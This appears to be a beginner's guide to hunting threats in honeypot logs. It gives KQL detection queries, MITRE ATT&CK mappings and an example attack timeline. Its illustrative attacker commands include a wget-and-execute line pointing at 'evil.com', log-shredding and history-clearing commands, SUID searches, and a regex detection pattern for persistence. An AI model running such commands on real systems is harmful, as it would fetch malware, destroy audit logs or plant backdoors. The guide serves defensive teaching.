# Threat Hunting on Honeypots — A Beginner's Guide

**What is this?** Our honeypots (Meridian HR and Cascade Medical) are intentionally vulnerable systems designed to attract real attackers. Every login attempt, command, and network probe is logged. This guide teaches you how to read those logs and find the stories hidden inside them.

---

## What to Look For First (Priority Order)

### 1. Successful Authentications — CRITICAL

Someone got in. This is your highest-priority alert.

Run this KQL query first:
```kql
HoneypotEvents_CL
| where EventType == "auth_attempt"
| where isnotempty(Username) and isnotempty(Password)
| join kind=inner (
    HoneypotEvents_CL | where EventType == "command" | summarize by SessionId
  ) on SessionId
| project TimeGenerated, Honeypot, Service, SrcIP, Username, Password, SessionId
| order by TimeGenerated desc
```

**What to investigate next:**
- What did they do immediately after? (commands within 30 seconds)
- Where are they from? Look up the IP at https://ipinfo.io/[IP]
- Have they hit both honeypots?
- Did they try to download anything or leave a backdoor?

---

### 2. Command Execution Chains

A single `whoami` is boring. A sequence of commands tells a story. Look for these patterns:

**Privilege checking chain:**
```
whoami → id → sudo -l → sudo su
```
Translation: "I got a shell. Who am I? Can I become root?"

**Internal network discovery:**
```
cat /etc/hosts → nmap 10.0.0.5 → ssh 10.0.0.5
```
Translation: "I found another server on the network and I'm going to try to get into it."

**Malware deployment:**
```
wget http://evil.com/payload → chmod +x payload → ./payload
```
Translation: "I'm downloading and running malicious software."

Run this to find multi-stage sessions:
```kql
HoneypotEvents_CL
| where EventType == "command"
| summarize Commands=make_list(Command, 50), Count=count() by SessionId, SrcIP, Honeypot
| where Count > 3
| order by Count desc
```

---

### 3. Lateral Movement — Your Most Dangerous Attackers

Lateral movement means an attacker moved from one of our systems to the other. This is a big deal — it means they're not just scanning, they're actively hunting our network.

**What to look for:**
- IPs that appear on **both** Meridian HR AND Cascade Medical
- SSH commands targeting 10.0.0.x addresses (our internal network range)
- `cat /etc/hosts` followed by `nmap` or `ssh` commands

```kql
HoneypotEvents_CL
| where EventType in ("auth_attempt", "command")
| summarize Honeypots=make_set(Honeypot), Events=count() by SrcIP
| where array_length(Honeypots) > 1
| order by Events desc
```

Any IP in this list **crossed between our two systems**. These are your most sophisticated actors.

---

### 4. Persistence Attempts

Persistence means the attacker is trying to come back even after we patch the vulnerability. Red flags:

| Command | What it means |
|---------|--------------|
| `ssh-keygen` | Generating a backdoor SSH key |
| `crontab -e` | Setting up a scheduled task to run malware |
| Writing to `~/.ssh/authorized_keys` | Adding their key so they can log in anytime |
| `useradd` or `adduser` | Creating a hidden account |
| Writing to `~/.bashrc` | Running code every time someone logs in |

```kql
HoneypotEvents_CL
| where EventType == "command"
| where Command matches regex @"(?i)(ssh-keygen|crontab|authorized_keys|useradd|\.bashrc|systemctl enable)"
| project TimeGenerated, Honeypot, SrcIP, SessionId, Command
| order by TimeGenerated desc
```

---

## Correlations to Watch For

### Recon → Exploitation → Persistence Pattern

This is the classic attack kill chain:

```
1. cat /etc/hosts           ← finds 10.0.0.5 (Cascade Medical)
2. nmap -sV 10.0.0.5        ← scans it, finds SSH on port 22
3. ssh admin@10.0.0.5       ← LATERAL MOVEMENT
4. ssh-keygen               ← PERSISTENCE (leaves a backdoor)
```

**MITRE ATT&CK mapping:** T1016 → T1018 → T1021.004 → T1098.004

This is not a script kiddie. This is someone who knows what they're doing.

---

### Credential Stuffing Pattern

Automated tools trying thousands of password combinations:

```
admin/password   → FAIL
admin/admin      → FAIL
admin/123456     → FAIL
admin/password1  → FAIL
... (repeat 5,000 times)
root/toor        → SUCCESS ← one of 5,000 worked
```

**Signs it's automated:**
- Attempts come in rapid bursts (100+ per minute)
- Passwords are from wordlists (rockyou.txt, SecLists)
- Username rotates through a predictable list (root, admin, test, user, pi, oracle)
- Timing is perfectly regular (no human hesitation)

**Tools used:** Hydra, Medusa, Crowbar, Burp Suite Intruder

**Sophistication: LOW** — this is script kiddie territory, but it still works if passwords are weak.

---

### Privilege Escalation Attempt

The attacker got a low-privilege shell and wants root:

```
$ whoami          → appuser (not root)
$ sudo -l         → checking what they can run as sudo
$ sudo su         → trying to become root
$ cat /etc/sudoers → looking for misconfiguration
$ find / -perm -4000 2>/dev/null → looking for SUID binaries
```

**Why this matters:** If they get root, they own the system completely. They can read all files, install anything, create hidden users, and wipe logs.

---

### Defense Evasion — Covering Tracks

Smart attackers clean up after themselves:

```
$ history -c                    ← clears command history
$ rm -f ~/.bash_history          ← deletes history file
$ unset HISTFILE                ← disables history for this session
$ shred /var/log/auth.log       ← destroys authentication logs
```

If you see these commands, an attacker knows they're being watched and is trying to hide.

---

## Mapping the Full Attack Chain (MITRE ATT&CK)

Every attacker follows some version of this kill chain. Your job as a threat hunter is to find where on this chain each attacker got to.

```
┌─────────────────────────────────────────────────────────────────┐
│  1. INITIAL ACCESS                                               │
│     How did they get in?                                         │
│     → SSH brute force, RDP, default credentials, exploit        │
├─────────────────────────────────────────────────────────────────┤
│  2. EXECUTION                                                    │
│     What did they run?                                           │
│     → whoami, ls, cat /etc/passwd, wget malware                 │
├─────────────────────────────────────────────────────────────────┤
│  3. PERSISTENCE                                                  │
│     Did they try to stay?                                        │
│     → ssh-keygen, crontab, authorized_keys, useradd             │
├─────────────────────────────────────────────────────────────────┤
│  4. PRIVILEGE ESCALATION                                         │
│     Did they try for root?                                       │
│     → sudo -l, sudo su, SUID binary abuse                       │
├─────────────────────────────────────────────────────────────────┤
│  5. DISCOVERY                                                    │
│     What did they map out?                                       │
│     → /etc/hosts, nmap, ps aux, netstat                         │
├─────────────────────────────────────────────────────────────────┤
│  6. LATERAL MOVEMENT                                             │
│     Did they reach other systems?                                │
│     → SSH to 10.0.0.x, same credentials on Cascade Medical      │
├─────────────────────────────────────────────────────────────────┤
│  7. DEFENSE EVASION                                              │
│     Did they cover tracks?                                       │
│     → history -c, rm ~/.bash_history, iptables -F               │
├─────────────────────────────────────────────────────────────────┤
│  8. IMPACT                                                       │
│     What was the end goal?                                       │
│     → data theft, crypto miner, persistence, disruption         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Example Hunt: The Complete Attack Story

**IP: 118.194.250.127 (China)**

```
2026-06-18 16:10:00  SSH auth attempt  admin/admin       → FAIL
2026-06-18 16:10:05  SSH auth attempt  root/root         → FAIL
2026-06-18 16:10:10  SSH auth attempt  test/test         → SUCCESS ← BREACH
2026-06-18 16:10:15  Command: whoami                     → "appuser"
2026-06-18 16:10:20  Command: cat /etc/hosts             → sees 10.0.0.5
2026-06-18 16:10:30  Command: nmap -sV 10.0.0.5          → finds Cascade Medical SSH
2026-06-18 16:11:00  SSH to 10.0.0.5:22                 → LATERAL MOVEMENT
2026-06-18 16:11:05  Command: ssh-keygen                 → PERSISTENCE ATTEMPT
```

**What this tells us:**

| Kill Chain Stage | Evidence |
|-----------------|---------|
| Initial Access | Brute force with default creds (test/test) |
| Execution | whoami, cat /etc/hosts |
| Discovery | nmap scan of internal network |
| Lateral Movement | SSH pivot to Cascade Medical (10.0.0.5) |
| Persistence | ssh-keygen (attempted backdoor) |
| Defense Evasion | None observed |

**Attacker Sophistication: 5/10** — They used basic tools but successfully pivoted between systems. Not a script kiddie, but not APT-level either. Likely using a semi-automated toolkit.

**MITRE ATT&CK Techniques:**
- T1110.001 — Brute Force: Password Guessing
- T1033 — System Owner/User Discovery
- T1016 — System Network Configuration Discovery
- T1018 — Remote System Discovery
- T1021.004 — Remote Services: SSH
- T1098.004 — Account Manipulation: SSH Authorized Keys

---

## Quick Reference: KQL Cheat Sheet

```kql
// Did anyone get a shell today?
HoneypotEvents_CL
| where TimeGenerated > ago(24h) and EventType == "command"
| summarize Commands=count() by SrcIP, Honeypot
| order by Commands desc

// What commands were most popular?
HoneypotEvents_CL
| where EventType == "command"
| summarize Count=count() by Command
| top 20 by Count

// Who hit both honeypots?
HoneypotEvents_CL
| summarize Honeypots=make_set(Honeypot) by SrcIP
| where array_length(Honeypots) > 1

// Any persistence attempts today?
HoneypotEvents_CL
| where TimeGenerated > ago(24h) and EventType == "command"
| where Command matches regex @"(?i)(ssh-keygen|crontab|authorized_keys|useradd)"

// Biggest attack volume by country (rough — by IP range)
HoneypotEvents_CL
| summarize Events=count() by SrcIP
| order by Events desc
| take 50
```

---

## Glossary

| Term | Plain English |
|------|--------------|
| Brute force | Trying thousands of passwords until one works |
| Credential stuffing | Using real leaked passwords from other breaches |
| Lateral movement | Moving from one hacked system to another |
| Persistence | Ensuring access survives a reboot or password change |
| Privilege escalation | Going from regular user to admin/root |
| Defense evasion | Hiding your tracks to avoid detection |
| TTP | Tactics, Techniques, and Procedures — the "how" of an attack |
| IOC | Indicator of Compromise — evidence that a breach occurred (IP, hash, filename) |
| MITRE ATT&CK | A public database of real-world attack techniques |
| APT | Advanced Persistent Threat — sophisticated, often nation-state hackers |
| Script kiddie | Beginner attacker using pre-built tools, no real skill |
| Kill chain | The sequence of steps an attacker follows from initial access to goal |
